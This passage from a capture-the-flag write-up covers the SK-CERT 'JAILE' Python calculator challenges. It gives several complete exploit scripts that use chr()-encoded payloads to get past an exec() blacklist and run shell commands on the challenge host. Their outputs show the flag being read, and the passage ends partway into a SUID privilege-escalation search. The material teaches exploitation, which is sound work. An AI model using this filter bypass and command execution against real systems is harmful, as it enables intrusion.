+</span></span><span style=display:flex><span>            flag <span style=color:#f92672>=</span> decoded_response.split<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;\n&#39;</span><span style=color:#f92672>)[</span>1<span style=color:#f92672>]</span> <span style=color:#75715e># The output starts with &#39;&gt;&gt; &#39;, then the flag, then the return code</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;\n[*] Flag: {flag}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    except socket.timeout:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Connection timed out to {HOST}:{PORT}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    except socket.error as e:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Socket error: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    except Exception as e:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] An error occurred: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    main<span style=color:#f92672>()</span>
+</span></span></code></pre></div><ol start=3><li><p><strong>Initial Exploration:</strong> Ran the exploit with the command <code>ls -la</code>.
+The output revealed the presence of <code>flag.txt</code> in the current directory:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&gt;&gt; total <span style=color:#ae81ff>32</span>
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> calc calc <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>31</span> 20:22 .
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>31</span> 20:01 ..
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> calc calc  <span style=color:#ae81ff>220</span> Apr <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> .bash_logout
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> calc calc <span style=color:#ae81ff>3526</span> Apr <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> .bashrc
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> calc calc  <span style=color:#ae81ff>807</span> Apr <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> .profile
+</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#ae81ff>1</span> root root   <span style=color:#ae81ff>38</span> Mar <span style=color:#ae81ff>31</span> 16:53 flag.txt
+</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>1762</span> Mar <span style=color:#ae81ff>31</span> 20:22 main.py
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>
+</span></span></code></pre></div><ol start=4><li><strong>Flag Retrieval:</strong> Modified the command in <code>exploit.py</code> to <code>cat flag.txt</code> and reran the script.
+The service executed the command and returned its output, which included the flag:</li></ol><blockquote><blockquote><p>SK-CERT{35c3p1ng_py7h0n_15_345y_745k}
+0</p></blockquote></blockquote><h2 id=retrieved-flag>Retrieved Flag</h2></li></ol><p>The flag obtained from the service is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>**<span style=color:#e6db74>`</span>SK-CERT<span style=color:#f92672>{</span>35c3p1ng_py7h0n_15_345y_745k<span style=color:#f92672>}</span><span style=color:#e6db74>`</span>**
+</span></span></code></pre></div><h2 id=conclusion>Conclusion</h2><p>The vulnerability lies in the insecure use of <code>exec()</code> combined with an inadequate blacklist filter. By leveraging Python&rsquo;s built-in capabilities and character encoding, the filter was bypassed, allowing arbitrary command execution and retrieval of the flag.</p><p>The second challenge on the same calculator was this:</p><h3 id=jaile---user><strong>JAILE - User</strong></h3><p><img src="https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup6/images/jaille%20user.png?raw=true" alt=web></p><p><strong>solution</strong></p><p>That is interesting functionality. We can see that a separate user was created to run the calculator, but maybe the root user has more secrets that can be uncovered.</p><p>This challenge suggests that we need to access root user secrets using the same vulnerability we exploited in the first part. I&rsquo;ll modify our exploit to explore the system further and look for root user data.
+Starting to analyze the system for potential root access methods.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>import socket
+</span></span><span style=display:flex><span>import sys
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>HOST <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;exp.cybergame.sk&#34;</span>
+</span></span><span style=display:flex><span>PORT <span style=color:#f92672>=</span> <span style=color:#ae81ff>7002</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def build_payload<span style=color:#f92672>(</span>command<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;Builds the payload using chr() to bypass filters.&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    import_key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in <span style=color:#e6db74>&#34;__import__&#34;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    os_module <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in <span style=color:#e6db74>&#34;os&#34;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    system_func <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in <span style=color:#e6db74>&#34;system&#34;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    cmd_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in command<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> f<span style=color:#e6db74>&#34;getattr(__builtins__.__dict__[{import_key}]({os_module}), {system_func})({cmd_str})&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> payload
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def main<span style=color:#f92672>()</span>:
+</span></span><span style=display:flex><span>    command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;id&#34;</span> <span style=color:#75715e># Check the current user ID</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> build_payload<span style=color:#f92672>(</span>command<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    try:
+</span></span><span style=display:flex><span>        with socket.socket<span style=color:#f92672>(</span>socket.AF_INET, socket.SOCK_STREAM<span style=color:#f92672>)</span> as s:
+</span></span><span style=display:flex><span>            s.settimeout<span style=color:#f92672>(</span>10<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[*] Connecting to {HOST}:{PORT}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            s.connect<span style=color:#f92672>((</span>HOST, PORT<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Connected.&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Sending payload...&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            s.sendall<span style=color:#f92672>(</span>payload.encode<span style=color:#f92672>()</span> + b<span style=color:#e6db74>&#39;\n&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Payload sent.&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Receiving response...&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            response <span style=color:#f92672>=</span> b<span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>            try:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>while</span> True:
+</span></span><span style=display:flex><span>                    chunk <span style=color:#f92672>=</span> s.recv<span style=color:#f92672>(</span>4096<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> not chunk:
+</span></span><span style=display:flex><span>                        break
+</span></span><span style=display:flex><span>                    response <span style=color:#f92672>+=</span> chunk
+</span></span><span style=display:flex><span>            except socket.timeout:
+</span></span><span style=display:flex><span>                print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Socket timeout reached.&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            except Exception as e:
+</span></span><span style=display:flex><span>                print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Error while receiving: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Response received:&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            decoded_response <span style=color:#f92672>=</span> response.decode<span style=color:#f92672>(</span>errors<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ignore&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span>decoded_response<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    except socket.timeout:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Connection timed out to {HOST}:{PORT}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    except socket.error as e:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Socket error: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    except Exception as e:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] An error occurred: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    main<span style=color:#f92672>()</span>
+</span></span></code></pre></div><p>Starting to analyze the system for potential root access methods.</p><p>Analyzing the system to understand user context and potential root access methods.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ubuntu@sandbox:~ $ cd /home/ubuntu <span style=color:#f92672>&amp;&amp;</span> python3 /home/ubuntu/exploit_user.py
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Connecting to exp.cybergame.sk:7002
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Connected.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending payload...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Payload sent.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Receiving response...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Response received:
+</span></span><span style=display:flex><span>&gt;&gt; uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>calc<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>calc<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>calc<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>
+</span></span></code></pre></div><p>Exploring the file system structure to locate potential root user secrets.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ubuntu@sandbox:~ $ cd /home/ubuntu <span style=color:#f92672>&amp;&amp;</span> python3 /home/ubuntu/exploit_user.py
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Connecting to exp.cybergame.sk:7002
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Connected.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending payload...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Payload sent.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Receiving response...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Response received:
+</span></span><span style=display:flex><span>&gt;&gt; total <span style=color:#ae81ff>68</span>
+</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>27</span> 18:34 .
+</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>27</span> 18:34 ..
+</span></span><span style=display:flex><span>-rwxr-xr-x   <span style=color:#ae81ff>1</span> root root    <span style=color:#ae81ff>0</span> Apr <span style=color:#ae81ff>27</span> 18:34 .dockerenv
+</span></span><span style=display:flex><span>lrwxrwxrwx   <span style=color:#ae81ff>1</span> root root    <span style=color:#ae81ff>7</span> May <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2024</span> bin -&gt; usr/bin
+</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>2</span> root root <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2024</span> boot
+</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>5</span> root root  <span style=color:#ae81ff>340</span> Apr <span style=color:#ae81ff>27</span> 18:34 dev
+</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>27</span> 18:34 etc
+</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>31</span> 20:01 home
+</span></span><span style=display:flex><span>lrwxrwxrwx   <span style=color:#ae81ff>1</span> root root    <span style=color:#ae81ff>7</span> May <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2024</span> lib -&gt; usr/lib
+</span></span><span style=display:flex><span>lrwxrwxrwx   <span style=color:#ae81ff>1</span> root root    <span style=color:#ae81ff>9</span> May <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2024</span> lib64 -&gt; usr/lib64
+</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>2</span> root root <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2024</span> media
+</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>2</span> root root <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2024</span> mnt
+</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>2</span> root root <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2024</span> opt
+</span></span><span style=display:flex><span>dr-xr-xr-x <span style=color:#ae81ff>304</span> root root    <span style=color:#ae81ff>0</span> Apr <span style=color:#ae81ff>27</span> 18:34 proc
+</span></span><span style=display:flex><span>drwx------   <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>31</span> 20:01 root
+</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>27</span> 18:34 run
+</span></span><span style=display:flex><span>lrwxrwxrwx   <span style=color:#ae81ff>1</span> root root    <span style=color:#ae81ff>8</span> May <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2024</span> sbin -&gt; usr/sbin
+</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>2</span> root root <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2024</span> srv
+</span></span><span style=display:flex><span>dr-xr-xr-x  <span style=color:#ae81ff>13</span> root root    <span style=color:#ae81ff>0</span> Apr <span style=color:#ae81ff>27</span> 16:29 sys
+</span></span><span style=display:flex><span>drwxrwxrwt   <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>31</span> 20:00 tmp
+</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2024</span> usr
+</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2024</span> var
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>
+</span></span></code></pre></div><p>Identifying root user files and potential methods to access them.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>import socket
+</span></span><span style=display:flex><span>import sys
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>HOST <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;exp.cybergame.sk&#34;</span>
+</span></span><span style=display:flex><span>PORT <span style=color:#f92672>=</span> <span style=color:#ae81ff>7002</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def build_payload<span style=color:#f92672>(</span>command<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;Builds the payload using chr() to bypass filters.&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    import_key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in <span style=color:#e6db74>&#34;__import__&#34;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    os_module <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in <span style=color:#e6db74>&#34;os&#34;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    system_func <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in <span style=color:#e6db74>&#34;system&#34;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    cmd_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in command<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> f<span style=color:#e6db74>&#34;getattr(__builtins__.__dict__[{import_key}]({os_module}), {system_func})({cmd_str})&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> payload
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def main<span style=color:#f92672>()</span>:
+</span></span><span style=display:flex><span>    command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ls -la /root&#34;</span> <span style=color:#75715e># Try to list contents of root directory</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> build_payload<span style=color:#f92672>(</span>command<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    try:
+</span></span><span style=display:flex><span>        with socket.socket<span style=color:#f92672>(</span>socket.AF_INET, socket.SOCK_STREAM<span style=color:#f92672>)</span> as s:
+</span></span><span style=display:flex><span>            s.settimeout<span style=color:#f92672>(</span>10<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[*] Connecting to {HOST}:{PORT}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            s.connect<span style=color:#f92672>((</span>HOST, PORT<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Connected.&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Sending payload...&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            s.sendall<span style=color:#f92672>(</span>payload.encode<span style=color:#f92672>()</span> + b<span style=color:#e6db74>&#39;\n&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Payload sent.&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Receiving response...&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            response <span style=color:#f92672>=</span> b<span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>            try:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>while</span> True:
+</span></span><span style=display:flex><span>                    chunk <span style=color:#f92672>=</span> s.recv<span style=color:#f92672>(</span>4096<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> not chunk:
+</span></span><span style=display:flex><span>                        break
+</span></span><span style=display:flex><span>                    response <span style=color:#f92672>+=</span> chunk
+</span></span><span style=display:flex><span>            except socket.timeout:
+</span></span><span style=display:flex><span>                print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Socket timeout reached.&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            except Exception as e:
+</span></span><span style=display:flex><span>                print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Error while receiving: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Response received:&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            decoded_response <span style=color:#f92672>=</span> response.decode<span style=color:#f92672>(</span>errors<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ignore&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span>decoded_response<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    except socket.timeout:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Connection timed out to {HOST}:{PORT}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    except socket.error as e:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Socket error: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    except Exception as e:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] An error occurred: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    main<span style=color:#f92672>()</span>
+</span></span></code></pre></div><p>Attempting to identify root user files by listing the contents of /root directory.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ubuntu@sandbox:~ $ cd /home/ubuntu <span style=color:#f92672>&amp;&amp;</span> python3 /home/ubuntu/exploit_user.py
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Connecting to exp.cybergame.sk:7002
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Connected.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending payload...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Payload sent.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Receiving response...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Response received:
+</span></span><span style=display:flex><span>&gt;&gt; ls: cannot open directory <span style=color:#e6db74>&#39;/root&#39;</span>: Permission denied
+</span></span><span style=display:flex><span><span style=color:#ae81ff>512</span>
+</span></span></code></pre></div><p>Searching for SUID binaries that could be used for privilege escalation.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>import socket
+</span></span><span style=display:flex><span>import sys
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>HOST <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;exp.cybergame.sk&#34;</span>
+</span></span><span style=display:flex><span>PORT <span style=color:#f92672>=</span> <span style=color:#ae81ff>7002</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def build_payload<span style=color:#f92672>(</span>command<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;Builds the payload using chr() to bypass filters.&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    import_key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in <span style=color:#e6db74>&#34;__import__&#34;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    os_module <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in <span style=color:#e6db74>&#34;os&#34;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    system_func <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in <span style=color:#e6db74>&#34;system&#34;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    cmd_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in command<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> f<span style=color:#e6db74>&#34;getattr(__builtins__.__dict__[{import_key}]({os_module}), {system_func})({cmd_str})&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> payload
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def main<span style=color:#f92672>()</span>:
+</span></span><span style=display:flex><span>    command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;find / -type f -perm -4000 -ls 2&gt;/dev/null&#34;</span> <span style=color:#75715e># Look for SUID binaries</span>
